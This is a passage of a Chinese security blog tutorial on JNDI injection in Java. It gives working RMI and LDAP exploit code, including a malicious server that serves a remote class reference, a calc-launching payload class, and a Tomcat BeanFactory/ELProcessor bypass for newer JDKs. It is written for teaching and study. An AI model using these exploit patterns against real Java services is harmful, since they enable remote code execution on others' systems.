+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>JNDIRMIClinet.java：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> javax.naming.InitialContext;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>JNDIRMIClient</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String args<span style=color:#f92672>[]</span>) <span style=color:#66d9ef>throws</span> Exception {
+</span></span><span style=display:flex><span>        InitialContext initialContext <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InitialContext();
+</span></span><span style=display:flex><span>        IRmoteObj remoteObj <span style=color:#f92672>=</span> (IRmoteObj) initialContext.<span style=color:#a6e22e>lookup</span>(<span style=color:#e6db74>&#34;rmi://127.0.0.1:1099/remoteObj&#34;</span>);
+</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(remoteObj.<span style=color:#a6e22e>sayHello</span>(<span style=color:#e6db74>&#34;hello&#34;</span>));
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=jndi-rmi-注入>JNDI RMI 注入<a hidden class=anchor aria-hidden=true href=#jndi-rmi-注入>#</a></h2><p>攻击者在自己服务器上构造恶意的JNDI RMI服务，JNDIRMIServer.java：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> javax.naming.InitialContext;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.naming.Reference;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.registry.LocateRegistry;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>JNDIRMIServer</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
+</span></span><span style=display:flex><span>        LocateRegistry.<span style=color:#a6e22e>createRegistry</span>(1099);
+</span></span><span style=display:flex><span><span style=color:#75715e>//        RmoteObjImpl remoteObj = new RmoteObjImpl();</span>
+</span></span><span style=display:flex><span>        InitialContext initialContext <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InitialContext();
+</span></span><span style=display:flex><span><span style=color:#75715e>//        initialContext.rebind(&#34;rmi://127.0.0.1:1099/remoteObj&#34;, remoteObj);</span>
+</span></span><span style=display:flex><span>        Reference refObj <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Reference(<span style=color:#e6db74>&#34;CalcRef&#34;</span>, <span style=color:#e6db74>&#34;CalcRef&#34;</span>, <span style=color:#e6db74>&#34;http://127.0.0.1:1088/&#34;</span>);
+</span></span><span style=display:flex><span>        initialContext.<span style=color:#a6e22e>rebind</span>(<span style=color:#e6db74>&#34;rmi://127.0.0.1:1099/remoteObj&#34;</span>, refObj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>CalcRef.java：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CalcRef</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>CalcRef</span>() <span style=color:#66d9ef>throws</span> IOException {
+</span></span><span style=display:flex><span>        Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;calc&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>同时要求JNDIRMIClient端lookup参数可控，JNDIRMIClient.java：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> javax.naming.InitialContext;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>JNDIRMIClient</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String args<span style=color:#f92672>[]</span>) <span style=color:#66d9ef>throws</span> Exception {
+</span></span><span style=display:flex><span>        InitialContext initialContext <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InitialContext();
+</span></span><span style=display:flex><span>        IRmoteObj remoteObj <span style=color:#f92672>=</span> (IRmoteObj) initialContext.<span style=color:#a6e22e>lookup</span>(<span style=color:#e6db74>&#34;rmi://127.0.0.1:1099/remoteObj&#34;</span>);  <span style=color:#75715e>// 此处应是攻击者ip</span>
+</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(remoteObj.<span style=color:#a6e22e>sayHello</span>(<span style=color:#e6db74>&#34;hello&#34;</span>));
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Java 8u121+ (包括 Java 9, 11, 17, 21 等): Oracle 引入了安全补丁，将 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认设置为 false。这直接阻止了 JVM 从 Codebase URL 加载远程类，使 RMI 协议的 JNDI 注入几乎无法利用</p><h2 id=jndi-ladp-注入>JNDI LADP 注入<a hidden class=anchor aria-hidden=true href=#jndi-ladp-注入>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> javax.naming.InitialContext;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.naming.Reference;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>JNDILDAPServer</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
+</span></span><span style=display:flex><span>        Reference refObj <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Reference(<span style=color:#e6db74>&#34;CalcRef&#34;</span>, <span style=color:#e6db74>&#34;CalcRef&#34;</span>, <span style=color:#e6db74>&#34;http://127.0.0.1:1088/&#34;</span>);
+</span></span><span style=display:flex><span>        InitialContext initialContext <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InitialContext();
+</span></span><span style=display:flex><span>        initialContext.<span style=color:#a6e22e>rebind</span>(<span style=color:#e6db74>&#34;ldap://127.0.0.1:10389/cn=test,dc=example,dc=com&#34;</span>, refObj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> javax.naming.InitialContext;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>JNDILDAPClient</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
+</span></span><span style=display:flex><span>        InitialContext initialContext <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InitialContext();
+</span></span><span style=display:flex><span>        initialContext.<span style=color:#a6e22e>lookup</span>(<span style=color:#e6db74>&#34;ldap://127.0.0.1:10389/cn=test,dc=example,dc=com&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=jndi-jdk高版本注入>JNDI jdk高版本注入<a hidden class=anchor aria-hidden=true href=#jndi-jdk高版本注入>#</a></h2><h3></h3><p>需要添加tomcat相关依赖，pom.xml：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;dependencies&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core --&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;dependency&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;groupId&gt;</span>org.apache.tomcat.embed<span style=color:#f92672>&lt;/groupId&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;artifactId&gt;</span>tomcat-embed-core<span style=color:#f92672>&lt;/artifactId&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;version&gt;</span>8.5.71<span style=color:#f92672>&lt;/version&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/dependency&gt;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;dependency&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;groupId&gt;</span>javax.el<span style=color:#f92672>&lt;/groupId&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;artifactId&gt;</span>javax.el-api<span style=color:#f92672>&lt;/artifactId&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;version&gt;</span>3.0.0<span style=color:#f92672>&lt;/version&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/dependency&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;dependency&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;groupId&gt;</span>org.glassfish<span style=color:#f92672>&lt;/groupId&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;artifactId&gt;</span>javax.el<span style=color:#f92672>&lt;/artifactId&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;version&gt;</span>3.0.0<span style=color:#f92672>&lt;/version&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/dependency&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/dependencies&gt;</span>
+</span></span></code></pre></div><p>JNDIRMIServerHighBypass.java：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.naming.ResourceRef;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.naming.InitialContext;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.naming.StringRefAddr;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.registry.LocateRegistry;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>JNDIRMIServerHighBypass</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
+</span></span><span style=display:flex><span>        LocateRegistry.<span style=color:#a6e22e>createRegistry</span>(1099);
+</span></span><span style=display:flex><span>        InitialContext initialContext <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InitialContext();
+</span></span><span style=display:flex><span>        ResourceRef resourceRef <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ResourceRef(<span style=color:#e6db74>&#34;javax.el.ELProcessor&#34;</span>, <span style=color:#66d9ef>null</span>, <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#66d9ef>true</span>, <span style=color:#e6db74>&#34;org.apache.naming.factory.BeanFactory&#34;</span>, <span style=color:#66d9ef>null</span>);
+</span></span><span style=display:flex><span>        resourceRef.<span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>new</span> StringRefAddr(<span style=color:#e6db74>&#34;forceString&#34;</span>, <span style=color:#e6db74>&#34;x=eval&#34;</span>));
+</span></span><span style=display:flex><span>        resourceRef.<span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>new</span> StringRefAddr(<span style=color:#e6db74>&#34;x&#34;</span>, <span style=color:#e6db74>&#34;Runtime.getRuntime().exec(&#39;calc&#39;)&#34;</span>));
+</span></span><span style=display:flex><span>        initialContext.<span style=color:#a6e22e>rebind</span>(<span style=color:#e6db74>&#34;rmi://127.0.0.1:1099/remoteObj&#34;</span>, resourceRef);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://blog.w8nn9z.top/>w8nn9z Blog</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
